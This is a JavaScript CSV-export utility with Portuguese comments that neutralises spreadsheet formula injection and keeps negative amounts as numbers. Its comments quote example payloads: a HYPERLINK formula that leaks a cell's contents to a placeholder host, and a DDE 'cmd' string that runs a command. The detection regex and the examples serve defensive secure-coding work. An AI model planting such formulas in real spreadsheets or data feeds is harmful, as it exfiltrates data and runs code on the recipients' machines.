// src/utils/csvExport.js
// Exportação CSV client-side, sem bibliotecas, pensada para Excel pt-PT:
// BOM UTF-8 (acentos corretos), separador ";", linhas CRLF e decimais com vírgula.
// Regra do produto: só dados reais passam por aqui — mock nunca é exportado.

/* ═══════════════════════════════════════════════════════════════════════════════════
 * INJEÇÃO DE FÓRMULA — O QUE O EXCEL FAZ COM O QUE NÓS ESCREVEMOS
 * ═══════════════════════════════════════════════════════════════════════════════════
 * O escape abaixo resolve o formato CSV: aspas, `;` e quebras de linha. Não resolve o
 * que a folha de cálculo faz DEPOIS de ler o ficheiro. O Excel, o LibreOffice e o
 * Google Sheets tratam uma célula começada por `=`, `+`, `-` ou `@` como FÓRMULA e
 * avaliam-na ao abrir.
 *
 * ─── PORQUE ISTO NÃO É TEÓRICO AQUI ────────────────────────────────────────────────
 * As colunas exportadas incluem `cliente`, `fornecedor`, `title`, `description` e
 * `category` — todas com origem no Bling, ou seja, texto que ninguém deste lado
 * escreveu nem revê. Um fornecedor registado como
 *
 *     =HYPERLINK("https://exemplo.invalid/?d="&A1;"Fatura")
 *
 * exporta-se como fórmula e, no ficheiro que o contabilista abre, transforma-se numa
 * ligação que leva consigo o conteúdo de outra célula. O `=cmd|...` do DDE é a versão
 * pior do mesmo problema. Quem abre estes ficheiros é precisamente quem tem os números
 * todos à frente.
 *
 * ─── O CUIDADO QUE ISTO OBRIGA: O `-` DE UM NÚMERO NEGATIVO ────────────────────────
 * `-1234,56` começa por `-` e NÃO é uma fórmula: é um valor a pagar. Neutralizá-lo
 * transformaria uma coluna de montantes em texto, e um CSV financeiro cujos números não
 * somam é uma avaria maior do que aquela que se estava a corrigir. Por isso a guarda
 * deixa passar o que é reconhecidamente um número — e só esse.
 *
 * A neutralização é o apóstrofo à cabeça, que é a convenção que estas três aplicações
 * entendem como "isto é texto" e não mostram na célula. */
const RE_INICIO_PERIGOSO = /^[=+\-@\t\r]/;
/* Um número, com sinal opcional e vírgula OU ponto decimal — o que `csvMoney` produz e
 * o que os campos numéricos trazem. Nada mais é tratado como número. */
const RE_NUMERO = /^-?\d+(?:[.,]\d+)?$/;
/* Espaço normal e espaço INQUEBRÁVEL (U+00A0). O segundo não é hipotético: chega em
 * texto colado a partir de páginas web e de PDFs, e é do que os nomes de fornecedor do
 * Bling vêm cheios. */
const RE_ESPACOS_A_CABECA = /^[  ]+/;

export function neutralizarFormula(s) {
  /* ─── PORQUE SE OLHA PARA O VALOR SEM OS ESPAÇOS À CABEÇA ─────────────────────────
   * `" =cmd|'/c calc'!A1"` e `"=cmd|'/c calc'!A1"` são a MESMA célula para quem abre o
   * ficheiro: basta uma limpeza de coluna, um "remover espaços" ou uma reimportação com
   * trim para o espaço desaparecer e a fórmula ficar armada. O espaço à cabeça é um
   * acidente de formatação, não uma defesa — e uma defesa que depende de ninguém
   * arrumar a folha não é uma defesa que se possa afirmar.
   *
   * A decisão é sobre o valor LIMPO; o que se escreve é o valor ORIGINAL com o apóstrofo
   * à frente, porque neutralizar não é sítio para também andar a alterar os dados. */
  const semEspacos = s.replace(RE_ESPACOS_A_CABECA, "");
  if (!RE_INICIO_PERIGOSO.test(semEspacos)) return s;
  /* O número continua a passar intacto — e agora também `" -1234,56"`, que é o mesmo
   * montante com um espaço que veio da fonte. Ver o bloco do `-` acima. */
  if (RE_NUMERO.test(semEspacos)) return s;
  return `'${s}`;
}

export function downloadCsv(filename, headers, rows) {
  const esc = (v) => {
    const s = neutralizarFormula(String(v ?? ""));
    return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  const line = (cells) => cells.map(esc).join(";");
  const csv = "\uFEFF" + [line(headers), ...rows.map(line)].join("\r\n");

  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

// Valor monetário para CSV: vírgula decimal, sem símbolo nem separador de milhar.
// O cabeçalho da coluna indica a moeda (ex.: "Valor (€)").
export function csvMoney(n) {
  return (Number(n) || 0).toFixed(2).replace(".", ",");
}